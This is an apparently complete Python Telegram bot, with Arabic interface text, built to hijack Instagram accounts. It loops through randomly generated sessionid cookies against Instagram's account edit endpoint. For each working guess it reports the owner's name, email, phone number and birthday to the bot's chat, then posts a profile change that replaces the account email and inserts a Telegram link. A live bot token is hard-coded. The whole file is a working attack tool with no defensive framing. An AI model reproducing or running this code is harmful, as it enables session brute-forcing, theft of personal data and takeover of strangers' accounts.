import requests
import time
import telebot
import random
#from os import system as cmd
from telebot import types
session = requests.Session()
token = "5133768377:AAFRuV3RanoYqg-s06AHjyz3vYbXu0KQKnw"
bot = telebot.TeleBot(token)
@bot.message_handler(commands=['start'])


def start(message):
    START = types.InlineKeyboardButton(text =" START BOT ", callback_data = 'START')
    maac = types.InlineKeyboardMarkup()
    maac.row_width = 1
    maac.add(START)
    bot.send_message(message.chat.id,text=f"*مرحبا بك في بوت سحب الحسابات عن طريق سيشن ايدي\n\n@MVMVP - @W_Y67*",parse_mode="markdown",reply_markup=maac)
@bot.callback_query_handler(func=lambda call: True)
def clase(call):
	if call.data=='START':
		ran = types.InlineKeyboardButton(text =" بدء الصيد 🇮🇶 ", callback_data = 'ran')
		maac1 = types.InlineKeyboardMarkup()
		maac1.row_width = 2
		maac1.add(ran)
		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f"* مرحبا بك في بوت صيد الحسابات\nBy :@MVMVP*",parse_mode="markdown",reply_markup=maac1)
	elif call.data =="ran":
		message = call.message
		
			
			
				
			
		ll='AQWERTYUIOPLKJHGFDSAZXCVBNMqwertyuioplkjhgfdazxcvbnm1234567890'
		L ='1234567890'
		c ='https://i.instagram.com/api/v1/accounts/edit/web_form_data/'
		sk=0
		br=0
		gm=0
		ya=0
		pr=0
		er =0
		Ba=0
		timm=0
		while True:
				M = str(''.join(random.choice(L)for i in range(10)))
				U =str(''.join(random.choice(ll)for i in range(16)))
				MM = str(''.join(random.choice(L)for i in range(1)))
				UU = str(''.join(random.choice(ll)for i in range(1)))
				MMM= str(''.join(random.choice(L)for i in range(1)))
				M1= str(''.join(random.choice(ll)for i in range(7)))
				sid= M+"%"+U+"%"+MM+UU+MMM+"%"+M1
				EW=str(''.join(random.choice(ll)for i in range(23))).lower()
				E=EW+"@gmail.com"
				
				
				
					
				head11 = {
		        'accept': '*/*',
		        'accept-encoding': 'gzip, deflate, br',
		        'accept-language': 'en-US,en;q=0.9',
		       # 'content-length': '336',
		        'content-type': 'application/x-www-form-urlencoded',
		        'cookie': f'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid={sid}',
		       # 'origin': 'https://www.instagram.com',
		        'referer': 'https://www.instagram.com/explore/search/',
		        'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
		        'sec-ch-ua-mobile': '?0',
		        'sec-fetch-dest': 'empty',
		        'sec-fetch-mode': 'cors',
		        'sec-fetch-site': 'same-origin',
		        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
		        'x-asbd-id': '437806',
		        'x-csrftoken': 'rKo9r63bfIf6qgv19TlLP6x7uuDn2o5a',
		        'x-ig-app-id': '936619743392459',
		        'x-ig-www-claim': 'hmac.AR2oFTCuitCzXvttHXW3DD1kZLwzL7oauskQL1Jp6ogO6FF6',
		        #x-requested-with': 'caee87137ae9',
		        'x-requested-with': 'XMLHttpRequest'
				}
				#rq = requests.post(c,headers=head11).text
				try:
				     y= requests.get(c,headers=head11).json()
				except requests.exceptions.JSONDecodeError as error:
					gm+=1
					aac = types.InlineKeyboardMarkup()
					aac.row_width = 2
					i2 = types.InlineKeyboardButton(text =f"Hit ✅ : {br}", callback_data = 'c')
					i4 = types.InlineKeyboardButton(text =f"Error S ❌: {gm} ", callback_data = 'c')
					i13= types.InlineKeyboardButton(text =f" 👉 {sid}", callback_data = 'c')
					aac.add(i2,i4,i13)
					bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text="جار الفحص......✔️",parse_mode="markdown",reply_markup=aac)
				else:
				
					da = str(y['form_data']['first_name'])
					n = str(y['form_data']['email'])
					u= str(y['form_data']['username'])
					p= str(y['form_data']['phone_number'])
					b= str(y['form_data']['birthday'])
					bot.send_message(message.chat.id, f"Name :{da}\nUsername : {u}\nEmail : {n}\nPhone Number : {p}\nOld Account :   {b}𓉆\n\nBY : @MVMVP - @W_Y67")
					url1=f"https://www.instagram.com/accounts/edit/?__d=dis"
					head1 = {
			        'accept': '*/*',
			        'accept-encoding': 'gzip, deflate, br',
			        'accept-language': 'en-US,en;q=0.9',
			       # 'content-length': '336',
			        'content-type': 'application/x-www-form-urlencoded',
			        'cookie': f'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid={sid}',
			       # 'origin': 'https://www.instagram.com',
			        'referer': 'https://www.instagram.com/explore/search/',
			        'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
			        'sec-ch-ua-mobile': '?0',
			        'sec-fetch-dest': 'empty',
			        'sec-fetch-mode': 'cors',
			        'sec-fetch-site': 'same-origin',
			        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
			        'x-asbd-id': '437806',
			        'x-csrftoken': 'ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2',
			        'x-ig-app-id': '936619743392459',
			        'x-ig-www-claim': 'hmac.AR2oFTCuitCzXvttHXW3DD1kZLwzL7oauskQL1Jp6ogO6FF6',
			        #x-requested-with': 'caee87137ae9',
			        'x-requested-with': 'XMLHttpRequest'
						}
						
					dat1 = {
				                    'first_name': 'Zaid',
				                    'email': f'{E}',
				                    'username': f'{u}',
				                    'phone_number': '',
				                    'biography': '@gzik',
				                    
				                    'external_url': 'https://t.me/W_Y67',
				                    'chaining_enabled': 'on'
						}
					rt = requests.post(url1,headers=head1,data=dat1).text
					if ('"status":"ok"') in rt:
						 bot.send_message(message.chat.id, f"Name :{da}\nUsername : {u}\nEmail New  : {E}\nPhone Number : {p}\nOld Account :   {b}𓉆\n\nBY : @MVMVP - @W_Y67")
					else:
						 print('')							
while True:
	try:
		bot.polling(none_stop=True)
	except Exception as e:
		   print(e)
		   time.sleep(3)
					
				
					
